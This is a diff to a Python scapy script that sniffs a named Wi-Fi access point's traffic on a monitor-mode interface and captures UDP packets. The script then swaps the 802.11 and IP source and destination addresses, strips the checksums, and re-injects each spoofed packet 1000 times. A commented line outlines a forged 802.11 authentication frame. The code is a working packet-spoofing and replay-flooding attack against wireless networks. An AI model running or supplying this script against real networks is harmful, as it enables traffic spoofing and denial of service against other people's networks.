@@ -1,4 +1,4 @@
-from scapy.all import RadioTap, LLC, Dot11FCS, Dot11QoS, Dot11Beacon, Dot11WEP, sniff, Dot11, ls, UDP, IP, send, sendp, sr, srp, FlagsField
+from scapy.all import RadioTap, Dot11FCS, LLC, Dot11QoS, Dot11Beacon, Dot11WEP, sniff, Dot11, ls, UDP, IP, send, sendp, sr, srp, FlagsField
 import binascii
 import sys
 import zlib
@@ -11,7 +11,6 @@ if len(sys.argv) < 3:
 First step: start sniffing the beacon
 and find information about it
 '''
-
 AP_NAME = bytes(sys.argv[1], encoding='utf-8')
 beacons = []
 
@@ -38,27 +37,29 @@ client_data = []
 def sniff_client(pkt):
     global AP_INFO
     if Dot11QoS in pkt:
-        if pkt.addr1 == AP_INFO['mac'] and UDP in pkt:
+        if (pkt.addr1 == AP_INFO['mac'] or pkt.addr2 == AP_INFO['mac'] or pkt.addr3 == AP_INFO['mac'] or pkt.addr4 == AP_INFO['mac'])and UDP in pkt:
+            print(pkt.addr1, pkt.addr2, pkt.addr3, pkt.addr4)
             client_data.append(pkt)
 
 sniff(count=int(sys.argv[2]), iface='wlan0mon', prn=sniff_client)
 
 for cd in client_data:
-    dport = cd[UDP].dport
-    sport = cd[UDP].sport
-    version = cd[IP].version
-    ihl = cd[IP].ihl
-    tos = cd[IP].tos
-    id = cd[IP].id
-    ttl = cd[IP].ttl
-    proto = cd[IP].proto
-    src = cd[IP].src
-    dst = cd[IP].dst
+    ls(cd)
 
+    tmp = cd[Dot11FCS].addr1
+    cd[Dot11FCS].addr1 = cd[Dot11FCS].addr3
+    cd[Dot11FCS].addr3 = tmp
 
+    tmp = cd[IP].src
+    cd[IP].src = cd[IP].dst
+    cd[IP].dst = tmp
 
-    sendp(stack, count=10000, inter=.1)
-    exit(1)
+    del cd[Dot11FCS].fcs
+    del cd[IP].chksum
+    del cd[UDP].chksum
+
+    cd.show2()
+    sendp(cd, count=1000)
 
 # packet = Dot11(addr1=[RECEIVER MAC], addr2=[SENDER MAC], addr3=[BSSID]) / Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
 
